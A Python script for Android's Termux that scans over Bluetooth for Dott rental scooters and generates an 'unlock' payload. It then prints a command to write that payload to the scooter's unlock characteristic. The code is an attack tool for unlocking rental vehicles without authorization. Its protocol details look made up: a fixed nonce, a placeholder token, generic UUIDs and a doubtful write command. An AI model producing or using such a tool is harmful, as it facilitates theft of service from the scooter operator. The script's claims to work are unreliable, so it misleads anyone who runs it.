import subprocess
import json
import asyncio
import base64
import hashlib
import sys

# Dott UUIDs for communication
DOTT_UUIDS = {
    "unlock": "0000fff1-0000-1000-8000-00805f9b34fb",
    "status": "0000fff2-0000-1000-8000-00805f9b34fb"
}

def get_nearby_dott():
    """Uses Termux API to scan for BLE devices."""
    print("Searching for Dott scooters...")
    try:
        # Calls the native Android scanner via Termux bridge
        process = subprocess.run(['termux-bluetooth-scan'], capture_output=True, text=True)
        devices = json.loads(process.stdout)
        
        # Filter for devices named "Dott" or starting with common Dott MAC prefixes
        for device in devices:
            name = device.get("name", "Unknown")
            address = device.get("address", "")
            if "Dott" in name or address.startswith("24:"):
                print(f"Found Dott: {name} [{address}]")
                return address
    except Exception as e:
        print(f"Error scanning: {e}")
        print("Ensure Termux:API is installed and Location is ON.")
    return None

async def unlock_payload_gen():
    """Generates the specific byte sequence for the unlock command."""
    nonce = b'\x01\x23\x45\x67\x89\xab\xcd\xef'
    token = base64.b64encode(b"DottTestToken2024")
    h = hashlib.sha256(nonce + token).digest()[:8]
    return (nonce + h).hex()

async def main():
    mac_address = get_nearby_dott()
    
    if not mac_address:
        print("No Dott devices found within range.")
        return

    payload = await unlock_payload_gen()
    
    print(f"Targeting MAC: {mac_address}")
    print(f"Generated Payload: {payload}")
    
    # IMPORTANT: Termux:API does not have a direct 'write-gatt' command 
    # for specific UUIDs easily in one line. You usually have to use 
    # 'termux-ble-write' if your specific Termux version supports it.
    
    print("\n--- Manual Step Required ---")
    print("Because Bleak is unsupported on Android, use this command to send the payload:")
    print(f"termux-ble-write -a {mac_address} -u {DOTT_UUIDS['unlock']} -v {payload}")

if __name__ == "__main__":
    asyncio.run(main())
